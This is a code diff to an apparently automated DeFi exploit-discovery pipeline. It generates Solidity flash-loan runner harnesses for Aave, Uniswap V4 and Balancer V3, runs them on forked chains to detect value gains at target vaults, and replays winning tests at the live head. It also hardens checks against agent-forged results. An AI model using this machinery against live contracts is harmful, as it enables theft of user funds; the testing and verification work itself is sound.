             violations.append("disallowed_console_address")
-        if _DEFAULT_SENDER_HEX_RE.search(clean_src):
+        if _DEFAULT_SENDER_HEX_RE.search(skel_stripped_src):
             violations.append("disallowed_default_sender_reference")
-        if _TEST_CONTRACT_HEX_RE.search(clean_src):
+        if _TEST_CONTRACT_HEX_RE.search(skel_stripped_src):
             violations.append("disallowed_test_harness_address_reference")
-        if _CREATE2_DEPLOYER_HEX_RE.search(clean_src):
+        if _CREATE2_DEPLOYER_HEX_RE.search(skel_stripped_src):
             violations.append("disallowed_create2_deployer_reference")
         if _SOL_SETUP_FN_RE.search(clean_src):
             violations.append("disallowed_setup_prestate_mutation")
@@ -18115,7 +18707,7 @@ def verify_cheatcode_allowlist(
                     vm_vars.add(m_var.group(1))
 
         call_re, _, vm_word_re = _compiled_vm_var_regexes(tuple(sorted(vm_vars)))
-        for rx, check_lowlevel in ((call_re, True), (_VM_INLINE_CALL_RE, False)):
+        for rx, check_lowlevel in ((call_re, True), (_VM_INLINE_CALL_RE, False), (_HEVM_INLINE_CAST_CALL_RE, True)):
             for m in rx.finditer(clean_src):
                 fn_name = m.group(1)
                 if check_lowlevel and fn_name in ("call", "staticcall", "delegatecall", "callcode"):
@@ -18369,8 +18961,6 @@ def select_zero_state_caller(
     c = _norm_chain(chain)
     btag = hex(block_pin) if block_pin > 0 else "latest"
     candidates = _deterministic_caller_candidates(c, exclude_addrs=exclude_addrs)
-    if block_pin <= 0:
-        return candidates[0]
     toks_to_check = list(dict.fromkeys(nt for t in (check_tokens or []) if (nt := _norm_addr(t))))
     for cand in candidates:
         try:
@@ -18394,6 +18984,8 @@ def select_zero_state_caller(
                 bal = int(str(res[0]), 16)
                 nonce = int(str(res[1]), 16)
                 code = _hex_to_bytes(res[2])
+                if _eip7702_delegate(code):
+                    continue
                 if bal == 0 and nonce == 0 and len(code) == 0:
                     if toks_to_check:
                         cand_padded = bytes(12) + bytes.fromhex(cand[2:])
@@ -18414,6 +19006,19 @@ def select_zero_state_caller(
                     return cand
         except Exception:
             continue
+    for cand in candidates:
+        try:
+            probe = router.batch_call(
+                c,
+                [("eth_getCode", [_checksum(cand), btag])],
+                block_pin=block_pin,
+                need_archive=False,
+            )
+            if probe and isinstance(probe[0], str) and not _eip7702_delegate(_hex_to_bytes(probe[0])):
+                if len(_hex_to_bytes(probe[0])) == 0:
+                    return cand
+        except Exception:
+            continue
     return candidates[0]
 
 
@@ -18426,7 +19031,12 @@ _PRAGUE_EVM_CHAINS: FrozenSet[str] = frozenset({
 
 
 def _target_foundry_evm_version(rpc_endpoints: Dict[str, str], explicit_evm_version: str = "") -> str:
-    """대상 체인 활성 런타임 하드포크 사양(Osaka/Fusaka · Prague/Pectra · Cancun)에 정합하는 Foundry EVM 타겟 산출."""
+    """대상 체인 활성 런타임 하드포크 사양(Osaka/Fusaka·Prague/Pectra·Cancun)에 정합하는 Foundry EVM 타겟 산출.
+
+    Osaka/Fusaka는 EIP-7823(MODEXP 입력 상한)·EIP-7825(단일 tx 가스 상한)·EIP-7883(MODEXP 재가격)·
+    EIP-7935(JUMPDEST 분석 제거)를, Prague/Pectra는 EIP-7702 위임·EIP-7623 콜데이터 하한·
+    EIP-7587·EIP-7685·EIP-7251을, Cancun은 EIP-1153 TSTORE/TLOAD를 포함한다(2026-11-17 SOTA).
+    """
     exp = explicit_evm_version.strip().lower()
     if exp in ("osaka", "prague", "cancun", "shanghai", "paris"):
         return exp
@@ -18619,6 +19229,11 @@ _SOLIDITY_SPDX_AND_VM_HEADER: str = """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
 interface Vm {
+    struct Log {
+        bytes32 topic0;
+        bytes32[] topics;
+        bytes data;
+    }
     function prank(address msgSender) external;
     function prank(address msgSender, address txOrigin) external;
     function startPrank(address msgSender) external;
@@ -18626,6 +19241,7 @@ interface Vm {
     function stopPrank() external;
     function assume(bool condition) external pure;
     function recordLogs() external;
+    function getRecordedLogs() external returns (Log[] memory);
 }"""
 
 
@@ -19391,11 +20007,22 @@ def _prepare_conservation_harness_context(
     eff_helper_suffix = _safe_solidity_ident(helper_suffix) if helper_suffix else safe_contract
 
     target_norm = _norm_addr(target_addr)
+    _vault_excl: FrozenSet[str] = frozenset({
+        "0x4e59b44847b379578588920ca78fbf26c0b4956c",
+        "0x7109709ecfa91a80626ff3989d68f67f5b1dd12d",
+        "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
+        "0x7fa9385be102ac3eac297483dd6233d62b3e1496",
+        "0x000000000000000000636f6e736f6c652e6c6f67",
+        "0x0000000000000000000000000000000000000000",
+        "0xcA11bde05977b3631167028862bE2a173976CA11",
+    }) | set(_infra_addresses_for_chain(norm_c))
     raw_vaults: List[str] = [target_norm] if target_norm else []
     seen_rv: Set[str] = set(raw_vaults)
     for src_seq in (vault_addresses or [], extra_vault_addresses or []):
         for v_a in src_seq:
             nv = _norm_addr(v_a)
+            if nv and nv in _vault_excl and nv != target_norm:
+                continue
             if nv and (nv != wnative_norm or nv == target_norm):
                 _append_unique(raw_vaults, seen_rv, nv)
     vault_chk_list = [_checksum(v) for v in raw_vaults[:32] if v]
@@ -20110,7 +20737,7 @@ def _render_minimal_solidity_harness(
         f_mode = int((f_hint or {}).get("mode") or 0)
         f_vault_n = _norm_addr((f_hint or {}).get("vault") or "")
         f_tok_n = _norm_addr((f_hint or {}).get("token") or "")
-        use_flash = bool(f_hint and f_mode in (1, 2, 3, 4) and f_vault_n and f_tok_n and sl.legs)
+        use_flash = bool(f_hint and f_mode in _STAGE4_FLASH_MODES and f_vault_n and f_tok_n and sl.legs)
         is_midframe = (sl.channel == "CH_MIDFRAME") and not use_flash
 
         def _resolve_sl_abi(sel_key: str) -> Tuple[List[str], List[str], bool]:
@@ -20389,6 +21016,13 @@ contract FlashRunner_{safe_contract} {{
         }} else if (mode == 3) {{
             (bool okA, ) = flashVault.call(abi.encodeWithSelector(0x42b0b77c, address(this), loanTok, loanAmt, "", uint16(0)));
             require(okA, "FAAV");
+        }} else if (mode == 5) {{
+            (bool okV4, ) = flashVault.call(abi.encodeWithSelector(0x48c89491, abi.encode(loanAmt)));
+            require(okV4, "FV4U");
+        }} else if (mode == 6) {{
+            bytes memory cbV3 = abi.encodeWithSelector(this.onBalancerV3Unlock.selector, loanAmt);
+            (bool okB3, ) = flashVault.call(abi.encodeWithSelector(0x48c89491, cbV3));
+            require(okB3, "FB3U");
         }} else {{
             (bool okE, bytes memory rE) = flashVault.call(abi.encodeWithSelector(0x5cffe9de, address(this), loanTok, loanAmt, ""));
             require(okE && (rE.length == 0 || (rE.length >= 32 && abi.decode(rE, (bool)))), "F3156");
@@ -20403,8 +21037,7 @@ contract FlashRunner_{safe_contract} {{
 {helper_tok_sweeps}
     }}
 
-    function _execAndRepay(address tok, uint256 amt, uint256 fee, bool transferRepay) internal {{
-        require(msg.sender == _expectedVault && _expectedVault != address(0), "FCBP");
+    function _execLegs(address tok, uint256 amt) internal {{
         for (uint256 i = 0; i < _legTgts.length; i++) {{
             address tgt = _legTgts[i];
             if (tgt != address(0) && tok != address(0)) {{
@@ -20418,6 +21051,11 @@ contract FlashRunner_{safe_contract} {{
                 _resetApprove(tok, tgt);
             }}
         }}
+    }}
+
+    function _execAndRepay(address tok, uint256 amt, uint256 fee, bool transferRepay) internal {{
+        require(msg.sender == _expectedVault && _expectedVault != address(0), "FCBP");
+        _execLegs(tok, amt);
         uint256 repayAmt = amt + fee;
         require(_tBal(tok, address(this)) >= repayAmt, "FREP");
         if (transferRepay) {{
@@ -20426,6 +21064,32 @@ contract FlashRunner_{safe_contract} {{
             _resetApprove(tok, msg.sender);
             _tApprove(tok, msg.sender, repayAmt);
         }}
+    }}
+
+    function unlockCallback(bytes calldata data) external returns (bytes memory) {{
+        require(msg.sender == _expectedVault && _expectedVault != address(0), "FCBP");
+        uint256 amt = abi.decode(data, (uint256));
+        (bool okTk, ) = msg.sender.call(abi.encodeWithSelector(0x0b0d9c09, _loanTok, address(this), amt));
+        require(okTk, "FV4T");
+        _execLegs(_loanTok, amt);
+        require(_tBal(_loanTok, address(this)) >= amt, "FREP");
+        (bool okSy, ) = msg.sender.call(abi.encodeWithSelector(0xa5841194, _loanTok));
+        require(okSy, "FV4Y");
+        _tTransfer(_loanTok, msg.sender, amt);
+        (bool okSt, ) = msg.sender.call(abi.encodeWithSelector(0x11da60b4));
+        require(okSt, "FV4S");
+        return "";
+    }}
+
+    function onBalancerV3Unlock(uint256 amt) external {{
+        require(msg.sender == _expectedVault && _expectedVault != address(0), "FCBP");
+        (bool okSnd, ) = msg.sender.call(abi.encodeWithSelector(0xae639329, _loanTok, address(this), amt));
+        require(okSnd, "FB3T");
+        _execLegs(_loanTok, amt);
+        require(_tBal(_loanTok, address(this)) >= amt, "FREP");
+        _tTransfer(_loanTok, msg.sender, amt);
+        (bool okSet, ) = msg.sender.call(abi.encodeWithSelector(0x15afd409, _loanTok, amt));
+        require(okSet, "FB3S");
     }}
 
     function receiveFlashLoan(address[] calldata tokens, uint256[] calldata amounts, uint256[] calldata feeAmounts, bytes calldata) external {{
@@ -20592,6 +21256,12 @@ _SOL_VERIFY_PRANK_CALLER_RE: re.Pattern[str] = re.compile(
 )
 _SOL_FORBIDDEN_LIQ_TOKEN_RE: re.Pattern[str] = re.compile(
     r"\b(?:TARGET|VAULT_\d+|emit\s+Conservation(?:Gain|SupplyMint|Bridge)|_assertConservation(?:Liq)?|_emitAsset\w*|_emit(?:DualNatW|SingleW|WNative)Gain)\b"
+)
+_SOL_LIQ_CREDIT_ASSIGN_RE: re.Pattern[str] = re.compile(
+    r"\bliqCredit\s*\[([^\]]+)\]\s*([+\-*/|&^]?=)\s*([^;]+);"
+)
+_SOL_LIQ_CREDIT_SAFE_SATADD_RE: re.Pattern[str] = re.compile(
+    r"^_satAdd\s*\(\s*liqCredit\s*\[([^\]]+)\]\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)$"
 )
 
 
@@ -20950,7 +21620,7 @@ def verify_agent_harness_accounting_integrity(
             v_idx = int(c_id[6:])
             if (
                 not na_c
-                or na_c in forb_const_addrs
+                or (na_c in forb_const_addrs and na_c != CREATE2_DEPLOYER_ADDR)
                 or v_idx in vault_const_map
                 or na_c in seen_vault_const_addrs
             ):
@@ -20962,7 +21632,7 @@ def verify_agent_harness_accounting_integrity(
             t_idx = int(c_id[4:])
             if (
                 not na_c
-                or na_c in forb_const_addrs
+                or (na_c in forb_const_addrs and na_c != CREATE2_DEPLOYER_ADDR)
                 or t_idx in tok_const_map
                 or na_c in seen_tok_const_addrs
             ):
@@ -21132,9 +21802,30 @@ def verify_agent_harness_accounting_integrity(
                     m_sn_w = _SOL_TAKE_SNAP_WNATIVE_RE.search(b_cmp)
                     snap_w_tok_idx = int(m_sn_w.group(1)) if m_sn_w else None
             elif fn_nm_c == "_tryLiquidateGains":
-                if _SOL_FORBIDDEN_LIQ_TOKEN_RE.search(fn_b_c) or (
-                    "liqCredit[" in fn_b_c and "_satAdd(" not in fn_b_c
-                ):
+                liq_bad = bool(_SOL_FORBIDDEN_LIQ_TOKEN_RE.search(fn_b_c))
+                if not liq_bad and "liqCredit[" in fn_b_c:
+                    if "_satAdd(" not in fn_b_c or "liqDebited[" not in fn_b_c:
+                        liq_bad = True
+                    else:
+                        lc_matches = list(_SOL_LIQ_CREDIT_ASSIGN_RE.finditer(fn_b_c))
+                        if not lc_matches:
+                            liq_bad = True
+                        for m_lc in lc_matches:
+                            lc_slot = _WS_COLLAPSE_RE.sub("", m_lc.group(1))
+                            lc_op = m_lc.group(2)
+                            lc_rhs = m_lc.group(3).strip()
+                            if lc_op != "=" or _has_literal_boost(lc_rhs):
+                                liq_bad = True
+                                break
+                            m_sat = _SOL_LIQ_CREDIT_SAFE_SATADD_RE.fullmatch(lc_rhs)
+                            if (
+                                m_sat is None
+                                or _WS_COLLAPSE_RE.sub("", m_sat.group(1)) != lc_slot
+                                or m_sat.group(2) in ("snapBefore", "snapMid")
+                            ):
+                                liq_bad = True
+                                break
+                if liq_bad:
                     violations.append("FORBIDDEN_TAMPERED_CANONICAL_FN:_tryLiquidateGains")
         elif _SOL_SHADOW_ZERO_CALLER_DECL_RE.search(fn_b_c):
             violations.append(f"FORBIDDEN_SHADOW_ZERO_STATE_CALLER:{fn_nm_c}")
@@ -21794,17 +22485,6 @@ def _scan_trace_tree_for_disallowed_hevm(
         "",
     }
 
-    def _frame_reverted(tr_d: Dict[str, Any]) -> bool:
-        if tr_d.get("success") is False or tr_d.get("reverted") is True:
-            return True
-        if tr_d.get("success") is True and tr_d.get("reverted") is not True:
-            return False
-        st_s = str(tr_d.get("status") or tr_d.get("error") or "").strip().lower()
-        return bool(
-            st_s
-            and st_s not in ("success", "ok", "none", "0x1", "1", "true", "return", "stop", "selfdestruct")
-        )
-
     def _is_disallowed_top_revert(tr_d: Dict[str, Any], kind_v: str, target_v: str, caller_v: str) -> bool:
         if not forbid_top_level_revert:
             return False
@@ -21852,7 +22532,7 @@ def _scan_trace_tree_for_disallowed_hevm(
             target_l = str(tr.get("address") or tr.get("to") or "").strip().lower()
             val_w = _hex_to_int(tr.get("value"))
             depth_n = tr.get("depth")
-            is_rev = _frame_reverted(tr)
+            is_rev = _is_trace_frame_reverted(tr)
             if target_l == HEVM_ADDRESS_LOWER and (
                 (depth_n is not None and int(depth_n) >= 2)
                 or parent_target not in ("", *harness_roots)
@@ -22024,7 +22704,7 @@ def _scan_trace_tree_for_disallowed_hevm(
                 kind_s = str(cur.get("kind") or cur.get("call_type") or "").strip().lower()
                 val_i = _hex_to_int(cur.get("value"))
                 depth_v = cur.get("depth")
-                is_rev_cur = _frame_reverted(cur)
+                is_rev_cur = _is_trace_frame_reverted(cur)
                 if (
                     is_rev_cur
                     and depth_v is not None
@@ -22205,6 +22885,27 @@ def _list_sibling_sol_relpaths(ws: Optional[Path], rel_test_path: str) -> List[s
     return siblings
 
 
+_FORK_STATE_BY_NUMBER_CHAINS: FrozenSet[str] = frozenset({"rootstock"})
+_BLOCKHASH_STATE_ERR_MARKERS: Tuple[str, ...] = (
+    "error code -32603",
+    "http error 500",
+    "temporary internal error",
+    "internal server error",
+    "blockhash",
+    "block hash",
+)
+
+
+def _requires_fork_state_by_number(chain: str = "", fork_url: str = "") -> bool:
+    c_n = _norm_chain(chain) if chain else ""
+    u_l = str(fork_url or "").lower()
+    return bool(
+        c_n in _FORK_STATE_BY_NUMBER_CHAINS
+        or "rsk.co" in u_l
+        or "rootstock" in u_l
+    )
+
+
 def _build_forge_test_cmd(
     rel_test_path: str,
     *,
@@ -22215,6 +22916,7 @@ def _build_forge_test_cmd(
     match_test: str = "",
     verbosity: str = "-vv",
     ws: Optional[Path] = None,
+    state_by_number: bool = False,
 ) -> List[str]:
     norm_rel = str(rel_test_path).replace("\\", "/").lstrip("./")
     cmd = [
@@ -22229,6 +22931,8 @@ def _build_forge_test_cmd(
         cmd.extend(["--skip", sib_rel])
     if always_fork or (fork_block > 0 and fork_url):
         cmd.extend(["--fork-url", fork_url, "--fork-block-number", str(int(fork_block))])
+        if state_by_number:
+            cmd.append("--fork-state-by-number")
     if gas_price_wei > 0:
         cmd.extend(["--gas-price", str(int(gas_price_wei))])
     if match_test:
@@ -22330,6 +23034,8 @@ def _record_per_test_trace_metrics(
 def _is_trace_frame_reverted(tr: Mapping[str, Any]) -> bool:
     if tr.get("success") is False or tr.get("reverted") is True:
         return True
+    if tr.get("success") is True and tr.get("reverted") is not True:
+        return False
     st_s = str(tr.get("status") or tr.get("error") or "").strip().lower()
     return bool(st_s and st_s not in ("success", "ok", "none", "0x1", "1", "true", "return", "stop", "selfdestruct"))
 
@@ -22991,11 +23697,13 @@ def _run_single_replay_trace_summary(
     *,
     forbid_top_level_revert: bool = False,
     require_nonreverted_target_call: bool = False,
+    state_by_number: bool = False,
 ) -> Dict[str, Any]:
     """
     단일 테스트에 대해 1회 리플레이(-vvvv --json)를 메모리에서 수행하여
     원시 전문 저장 없이 요약 메트릭, 대상 컨트랙트 실호출 여부 및 HEVM/하네스 트레이스 무결성을 추출한다.
     """
+    eff_sbn = bool(state_by_number or (not offline and _requires_fork_state_by_number(fork_url=fork_url)))
     cmd = _build_forge_test_cmd(
         rel_test_path,
         fork_url="" if offline else fork_url,
@@ -23004,6 +23712,7 @@ def _run_single_replay_trace_summary(
         match_test=test_name,
         verbosity="-vvvv",
         ws=ws,
+        state_by_number=eff_sbn,
     )
     try:
         proc = _run_forge_subproc(ws, cmd, timeout_sec)
@@ -23032,6 +23741,43 @@ def _run_single_replay_trace_summary(
             "fallback_reason": str(exc)[:160],
             "disallowed_cheatcode_in_trace": False,
         }
+
+
+_REAL_REPLAY_TRACE_FN = _run_single_replay_trace_summary
+
+
+def _filter_objs_for_test(parsed_objs: Sequence[Dict[str, Any]], test_name: str) -> List[Dict[str, Any]]:
+    clean_match = test_name.split("(", 1)[0].strip() if test_name else ""
+    if not clean_match:
+        return list(parsed_objs)
+    filtered: List[Dict[str, Any]] = []
+    for j_obj in parsed_objs:
+        if not isinstance(j_obj, dict):
+            continue
+        if isinstance(j_obj.get("test_results"), dict):
+            matched_tr = {
+                tk: tv for tk, tv in j_obj["test_results"].items()
+                if str(tk).split("(", 1)[0].strip() == clean_match
+            }
+            if matched_tr:
+                cp = dict(j_obj)
+                cp["test_results"] = matched_tr
+                filtered.append(cp)
+            continue
+        new_obj: Dict[str, Any] = {}
+        for sk, sv in j_obj.items():
+            if isinstance(sv, dict) and isinstance(sv.get("test_results"), dict):
+                matched_tr = {
+                    tk: tv for tk, tv in sv["test_results"].items()
+                    if str(tk).split("(", 1)[0].strip() == clean_match
+                }
+                if matched_tr:
+                    cp_sv = dict(sv)
+                    cp_sv["test_results"] = matched_tr
+                    new_obj[sk] = cp_sv
+        if new_obj:
+            filtered.append(new_obj)
+    return filtered
 
 
 def replay_compiled_test_at_live_head(
@@ -23070,6 +23816,7 @@ def replay_compiled_test_at_live_head(
                 conservation_gains=[],
                 error_reason=f"CHEATCODE_ARTIFACT_VIOLATION_AT_LIVE_HEAD:{','.join(viol_out_lh)}",
             )
+    sbn_lh = _requires_fork_state_by_number(fork_url=rpc_url)
     cmd = _build_forge_test_cmd(
         rel_test_path,
         fork_url=rpc_url,
@@ -23079,9 +23826,24 @@ def replay_compiled_test_at_live_head(
         match_test=match_test,
         verbosity="-vvvv",
         ws=ws,
+        state_by_number=sbn_lh,
     )
     try:
         proc = _run_forge_subproc(ws, cmd, timeout_sec)
+        if not sbn_lh and proc.returncode != 0 and "test_results" not in (proc.stdout or ""):
+            if _text_has_any_marker(f"{proc.stderr or ''}\n{proc.stdout or ''}", _BLOCKHASH_STATE_ERR_MARKERS):
+                cmd_retry = _build_forge_test_cmd(
+                    rel_test_path,
+                    fork_url=rpc_url,
+                    fork_block=live_head_block,
+                    always_fork=True,
+                    gas_price_wei=gas_price_wei,
+                    match_test=match_test,
+                    verbosity="-vvvv",
+                    ws=ws,
+                    state_by_number=True,
+                )
+                proc = _run_forge_subproc(ws, cmd_retry, timeout_sec)
     except Exception as exc:
         return ForgeRunOutcome(
             executed=False,
@@ -23093,22 +23855,9 @@ def replay_compiled_test_at_live_head(
     parsed_lh_objs = _parse_json_dict_lines(out_txt)
     passed, failed, gains = _parse_forge_json_gains(out_txt, parsed_objs=parsed_lh_objs)
     err_combined_lh = f"{out_txt}\n{proc.stderr or ''}".lower()
-    _lh_infra_markers = (
-        "error sending request",
-        "failed to get",
-        "rate limit",
-        "429",
-        "timed out",
-        "connection reset",
-        "connection refused",
-        "too many requests",
-        "(code: -32",
-        "backend",
-        "transport error",
-    )
     if (passed == 0 and failed == 0) or (
         passed == 0
-        and any(m in err_combined_lh for m in _lh_infra_markers)
+        and _text_has_any_marker(err_combined_lh, _FORGE_RPC_FAIL_MARKERS)
         and "revert" not in err_combined_lh
     ):
         err_snip = (proc.stderr or out_txt or f"rc={proc.returncode}").strip()[:240]
@@ -23312,6 +24061,7 @@ def verify_counterfactual_target_causality(
     eff_test = match_test or winning_test
     try:
         cf_path.write_text(mutated, encoding="utf-8")
+        use_sbn_cf = bool(not offline and _requires_fork_state_by_number(fork_url=fork_url))
         cmd = _build_forge_test_cmd(
             cf_rel,
             fork_url="" if offline else fork_url,
@@ -23319,8 +24069,27 @@ def verify_counterfactual_target_causality(
             gas_price_wei=gas_price_wei,
             match_test=eff_test,
             ws=ws,
+            state_by_number=use_sbn_cf,
         )
         proc = _run_forge_subproc(ws, cmd, timeout_sec)
+        if (
+            not offline
+            and fork_url
+            and fork_block > 0
+            and not use_sbn_cf
+            and proc.returncode != 0
+            and _text_has_any_marker(f"{proc.stderr or ''}\n{proc.stdout or ''}", _BLOCKHASH_STATE_ERR_MARKERS)
+        ):
+            cmd_retry_cf = _build_forge_test_cmd(
+                cf_rel,
+                fork_url=fork_url,
+                fork_block=fork_block,
+                gas_price_wei=gas_price_wei,
+                match_test=eff_test,
+                ws=ws,
+                state_by_number=True,
+            )
+            proc = _run_forge_subproc(ws, cmd_retry_cf, timeout_sec)
         out_cf = proc.stdout or ""
         if "test_results" not in out_cf:
             return CounterfactualCausalityResult(False, "COUNTERFACTUAL_COMPILE_OR_EXEC_FAILED")
@@ -23337,24 +24106,7 @@ def verify_counterfactual_target_causality(
             if cf_passed == 0 and cf_failed > 0:
                 # 변이체가 실패했더라도 포크 RPC 장애(429/타임아웃/백엔드 오류)로 인한 실패라면 인과성 증명이 아니다.
                 cf_err_txt = f"{out_cf}\n{proc.stderr or ''}".lower()
-                if (
-                    "revert" not in cf_err_txt
-                    and any(
-                        tok_rpc in cf_err_txt
-                        for tok_rpc in (
-                            "error sending request",
-                            "failed to get",
-                            "rate limit",
-                            "too many requests",
-                            "429",
-                            "timed out",
-                            "connection reset",
-                            "connection refused",
-                            "backend",
-                            "(code: -32",
-                        )
-                    )
-                ):
+                if "revert" not in cf_err_txt and _text_has_any_marker(cf_err_txt, _FORGE_RPC_FAIL_MARKERS):
                     return CounterfactualCausalityResult(False, "COUNTERFACTUAL_MUTANT_NOT_EXECUTED:RPC_BACKEND_ERROR")
             return CounterfactualCausalityResult(True, "OK")
         return CounterfactualCausalityResult(False, "COUNTERFACTUAL_NON_CAUSAL_GAIN_PERSISTED")
@@ -23577,7 +24329,7 @@ def prescreen_eth_call_batch(
 
         if calls:
             res = router.batch_call(c, calls, block_pin=block_pin, need_archive=True)
-            get_errs = getattr(router, "get_last_batch_errors", None)
+            get_errs = router.get_last_batch_errors if hasattr(router, "get_last_batch_errors") else None
             batch_errs = get_errs() if callable(get_errs) else {}
             probed_cnts: Dict[int, int] = {}
             revert_reasons: Dict[int, str] = {}
@@ -23696,15 +24448,38 @@ def execute_forge_test_file(
                 error_reason=f"CHEATCODE_ACCOUNTING_VIOLATION:{','.join(acct_violations)}",
             )
 
+    used_sbn = _requires_fork_state_by_number(chain, fork_url)
+    single_pass_vvvv = bool(
+        verify_trace_always
+        and fork_block > 0
+        and not offline
+        and globals().get("_run_single_replay_trace_summary") is _REAL_REPLAY_TRACE_FN
+    )
+    eff_verb = "-vvvv" if single_pass_vvvv else "-vv"
     cmd = _build_forge_test_cmd(
         rel_test_path,
         fork_url=fork_url,
         fork_block=fork_block,
         gas_price_wei=gas_price_wei,
+        verbosity=eff_verb,
         ws=ws,
+        state_by_number=used_sbn,
     )
     try:
         proc = _run_forge_subproc(ws, cmd, timeout_sec)
+        if not used_sbn and fork_block > 0 and fork_url and proc.returncode != 0 and "test_results" not in (proc.stdout or ""):
+            if _text_has_any_marker(f"{proc.stderr or ''}\n{proc.stdout or ''}", _BLOCKHASH_STATE_ERR_MARKERS):
+                used_sbn = True
+                cmd_sbn = _build_forge_test_cmd(
+                    rel_test_path,
+                    fork_url=fork_url,
+                    fork_block=fork_block,
+                    gas_price_wei=gas_price_wei,
+                    verbosity=eff_verb,
+                    ws=ws,
+                    state_by_number=True,
+                )
+                proc = _run_forge_subproc(ws, cmd_sbn, timeout_sec)
     except subprocess.TimeoutExpired:
         return ForgeRunOutcome(
             executed=False,
@@ -23734,28 +24509,59 @@ def execute_forge_test_file(
             error_reason=f"BYTECODE_CHEATCODE_VIOLATION:{','.join(bc_violations)}",
         )
 
-    passed, failed, gains = _parse_forge_json_gains(proc.stdout or "")
+    raw_stdout_str = proc.stdout or ""
+    objs_1 = _parse_json_dict_lines(raw_stdout_str)
+    passed, failed, gains = _parse_forge_json_gains(raw_stdout_str, parsed_objs=objs_1)
     trace_sum: Dict[str, Any] = {}
     per_test_trace: Dict[str, Dict[str, Any]] = {}
     has_target_constraint = bool(_norm_addr(target_addr) or [a for a in (target_addrs or []) if _norm_addr(a)])
 
     def _run_trace_guard(test_fn: str, *, has_gain: bool = False) -> Optional[ForgeRunOutcome]:
         nonlocal trace_sum
-        cur_sum = _run_single_replay_trace_summary(
-            ws,
-            rel_test_path,
-            test_fn,
-            fork_url=fork_url,
-            fork_block=fork_block,
-            forbid_inline_fork=forbid_inline_fork,
-            target_addr=target_addr,
-            gas_price_wei=gas_price_wei,
-            offline=(offline or fork_block <= 0),
-            target_addrs=target_addrs,
-            allowed_caller=allowed_caller,
-            forbid_top_level_revert=bool(strict_agent_accounting and forbid_inline_fork and has_gain),
-            require_nonreverted_target_call=has_gain,
-        )
+        cur_sum: Optional[Dict[str, Any]] = None
+        if single_pass_vvvv and proc.returncode == 0 and objs_1:
+            clean_fn_sp = test_fn.split("(", 1)[0].strip()
+            sub_objs_sp = _filter_objs_for_test(objs_1, test_fn)
+            if sub_objs_sp and any(_iter_exec_trace_arenas(sub_objs_sp, clean_fn_sp)):
+                metrics_sp, sub_out_l = _collect_trace_replay_metrics(
+                    "",
+                    forbid_inline_fork=forbid_inline_fork,
+                    target_addr=target_addr,
+                    target_addrs=target_addrs,
+                    allowed_caller=allowed_caller,
+                    match_test=test_fn,
+                    parsed_objs=sub_objs_sp,
+                    forbid_top_level_revert=bool(strict_agent_accounting and forbid_inline_fork and has_gain),
+                    require_nonreverted_target_call=has_gain,
+                )
+                cur_sum = {
+                    "replay_executed": True,
+                    "winning_test": test_fn,
+                    **metrics_sp,
+                    "conservation_event_verified": bool(
+                        has_gain
+                        or "conservationgain" in sub_out_l
+                        or CONSERVATION_GAIN_TOPIC0[2:].lower() in sub_out_l
+                    ),
+                }
+        if cur_sum is None:
+            cur_sum = _run_single_replay_trace_summary(
+                ws,
+                rel_test_path,
+                test_fn,
+                timeout_sec=max(35, int(timeout_sec)),
+                fork_url=fork_url,
+                fork_block=fork_block,
+                forbid_inline_fork=forbid_inline_fork,
+                target_addr=target_addr,
+                gas_price_wei=gas_price_wei,
+                offline=(offline or fork_block <= 0),
+                target_addrs=target_addrs,
+                allowed_caller=allowed_caller,
+                forbid_top_level_revert=bool(strict_agent_accounting and forbid_inline_fork and has_gain),
+                require_nonreverted_target_call=has_gain,
+                state_by_number=used_sbn,
+            )
         per_test_trace[test_fn] = dict(cur_sum)
         cur_obs_cd = int(cur_sum.get("observed_calldata_bytes") or 0)
         cur_obs_z = int(cur_sum.get("observed_calldata_zero_bytes") or 0)
@@ -23892,16 +24698,82 @@ def execute_forge_test_file(
                 error_reason="TRACE_REPLAY_UNVERIFIED",
             )
 
+    err_reason_out = ""
+    rpc_fork_corrupt = False
+    if not (proc.returncode == 0 or passed > 0):
+        err_blob = f"{proc.stderr or ''}\n{proc.stdout or ''}".strip()
+        is_rpc_fork_fail = (
+            _is_auth_denied_rpc_error(err_blob)
+            or _classify_rpc_error(err_blob) in ("quota", "wrong_chain")
+            or _text_has_any_marker(err_blob, _FORGE_RPC_FAIL_MARKERS)
+        )
+        if passed == 0 and failed > 0 and is_rpc_fork_fail:
+            rpc_fork_corrupt = True
+            err_reason_out = f"FORGE_NONZERO_EXIT:{' '.join(err_blob.split())[:200]}"
+        elif passed == 0 and failed == 0 and is_rpc_fork_fail:
+            err_reason_out = f"FORGE_NONZERO_EXIT:{' '.join(err_blob.split())[:200]}"
+        else:
+            err_reason_out = "FORGE_NONZERO_EXIT"
+
     return ForgeRunOutcome(
-        executed=(proc.returncode == 0 or passed > 0 or failed > 0),
+        executed=(not rpc_fork_corrupt and (proc.returncode == 0 or passed > 0 or failed > 0)),
         passed_tests=passed,
         failed_tests=failed,
         conservation_gains=gains,
         trace_summary=trace_sum,
         raw_stdout=(proc.stdout or "")[:8000],
         raw_stderr=(proc.stderr or "")[:4000],
-        error_reason="" if (proc.returncode == 0 or passed > 0) else "FORGE_NONZERO_EXIT",
+        error_reason=err_reason_out,
     )
+
+
+_FORGE_RPC_FAIL_MARKERS: Tuple[str, ...] = (
+    "failed to retrieve chain id",
+    "failed to get account",
+    "failed to get storage",
+    "failed to get",
+    "missing trie node",
+    "missing trie",
+    "header not found",
+    "state is not available",
+    "historical state",
+    "is not available",
+    "block not found",
+    "pruned",
+    "unknown state",
+    "archive requests require",
+    "public endpoint only serves recent",
+    "error sending request",
+    "connection reset",
+    "connection refused",
+    "timed out",
+    "too many requests",
+    "rate limit",
+    "429",
+    "transport error",
+    "server returned an error",
+    "error code -32603",
+    "-32603",
+    "(code: -32",
+    "backend",
+    "internal server error",
+    "http error 404",
+    "http error 429",
+    "http error 500",
+    "temporary internal error",
+)
+
+
+def _eval_archive_probe_resp(obj: Any) -> bool:
+    """Return True if an eth_call archive probe succeeded (or executed & reverted)."""
+    if not isinstance(obj, dict):
+        return False
+    if obj.get("error"):
+        err_obj = obj["error"]
+        err_msg = str((err_obj.get("message") if isinstance(err_obj, dict) else err_obj) or "").lower()
+        return "revert" in err_msg
+    res_v = obj.get("result")
+    return isinstance(res_v, str) and res_v.startswith("0x")
 
 
 def generate_and_run_forge_suites(
@@ -23913,15 +24785,16 @@ def generate_and_run_forge_suites(
